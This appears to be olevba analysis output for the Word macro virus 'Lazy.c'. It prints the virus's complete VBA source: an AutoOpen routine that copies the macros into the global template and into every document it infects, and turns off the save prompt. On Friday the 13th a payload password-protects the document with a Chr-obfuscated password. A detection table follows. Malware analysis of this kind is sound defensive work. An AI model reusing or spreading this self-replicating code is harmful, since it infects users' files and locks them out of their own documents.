olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lazy.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lazy.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Lazy.c - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Infects an existing Document or Template."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
On Error Resume Next

WordBasic.Call "Lazy.EnableAutoMacros"

WordBasic.Call "Lazy.CopyMacros", "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.Call "Lazy.CopyMacros", "Global:Lazy", WordBasic.[FileName$]() + ":Lazy"
WordBasic.Call "Lazy.SaveFile", 1

WordBasic.Call "Lazy.CopyMacros", WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen"
WordBasic.Call "Lazy.CopyMacros", WordBasic.[FileName$]() + ":Lazy", "Global:Lazy"
WordBasic.Call "Lazy.DisableGlobalPrompt"

WordBasic.Call "Lazy.Payload"

End Sub
-------------------------------------------------------------------------------
VBA MACRO Lazy.bas 
in file: Virus.MSWord.Lazy.c - OLE stream: 'Macros/VBA/Lazy'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Used by the Lazy Virus."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Lazy.MAIN"
'REM Lazy!
End Sub

Private Function CopyMacros(From$, To_$)
On Error Resume Next
WordBasic.MacroCopy From$, To_$, 1
End Sub

Private Function DisableGlobalPrompt()
On Error Resume Next
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
End Sub

Private Function EnableAutoMacros()
On Error Resume Next
WordBasic.DisableAutoMacros 0
End Sub

Private Function SaveFile(Format_)
On Error Resume Next
WordBasic.FileSaveAs Format:=Format_
End Sub

Private Function Payload()
Dim Password$
On Error Resume Next

If WordBasic.WeekDay(WordBasic.Now()) = 6 And WordBasic.Day(WordBasic.Now()) = 13 Then
Password$ = Chr(76) + Chr(97) + Chr(122) + Chr(121)
WordBasic.FileSaveAs Password:=Password$
End If

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

